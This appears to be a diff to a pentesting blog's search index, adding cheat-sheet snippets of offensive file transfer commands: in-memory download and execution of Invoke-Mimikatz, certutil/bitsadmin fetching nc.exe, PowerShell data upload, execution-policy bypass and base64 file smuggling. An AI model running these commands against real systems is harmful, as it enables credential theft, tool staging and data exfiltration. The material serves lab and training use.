@@ -1,6 +1,21 @@
 [
   
   {
+    "title": "file transfer command &amp; paste",
+    "url": "/posts/cheatsheet-ft/",
+    "categories": "command&paste",
+    "tags": "cheatsheet, filetransfer",
+    "date": "2022-08-18 11:00:00 +0200",
+    
+
+
+
+
+
+    "snippet": "            Command      Description                   Invoke-WebRequest https://&amp;lt;snip&amp;gt;/PowerView.ps1 -OutFile PowerView.ps1      Download a file with PowerShell              IEX (New-Object Net.WebClient).DownloadString(&#39;https://&amp;lt;snip&amp;gt;/Invoke-Mimikatz.ps1&#39;)      Execute a file in memory using PowerShell              Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64      Upload a file with PowerShell              bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe      Download a file using Bitsadmin              certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe      Download a file using Certutil              wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh      Download a file using Wget              curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh      Download a file using cURL              php -r &#39;$file = file_get_contents(&quot;https://&amp;lt;snip&amp;gt;/LinEnum.sh&quot;); file_put_contents(&quot;LinEnum.sh&quot;,$file);&#39;      Download a file using PHP              scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip      Upload a file using SCP              scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe      Download a file using SCP              Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile &quot;nc.exe&quot;      Invoke-WebRequest using a Chrome User Agent      "
+  },
+  
+  {
     "title": "windows command &amp; paste",
     "url": "/posts/winprivesc/",
     "categories": "command&paste",
@@ -357,7 +372,7 @@
 
 
 
-    "snippet": "Allow scripts to run within the scope of this PowerShell process:Set-ExecutionPolicy Bypass -Scope ProcessDownload a script from a webserver (eg. python3 -m http.server 8181):(New-Object Net.WebClient).DownloadString(&#39;http://&amp;lt;webserver&amp;gt;:8181/script.ps1&#39;) &amp;gt;.\\script.ps1Home of powershell"
+    "snippet": "Allow scripts to run within the scope of this PowerShell process:Set-ExecutionPolicy Bypass -Scope ProcessDownload a script from a webserver (eg. python3 -m http.server 8181):(New-Object Net.WebClient).DownloadString(&#39;http://&amp;lt;webserver&amp;gt;:8181/script.ps1&#39;) &amp;gt;.\\script.ps1Encode txt_file to Base64mascalz1@kali[/]$ cat txt_file |base64 -w 0;echoCopy the content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.Note: cmd.exe has a maximum string length of 8,191 charactersPS C:\\hackthis&amp;gt; [IO.File]::WriteAllBytes(&quot;C:\\Users\\Public\\txt_file&quot;, [Convert]::FromBase64String(&quot;output of the previous base64 command&quot;))Confirm the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.PS C:\\hackthis&amp;gt; Get-FileHash C:\\Users\\Public\\txt_file -Algorithm md5Home of powershell"
   },
   
   {
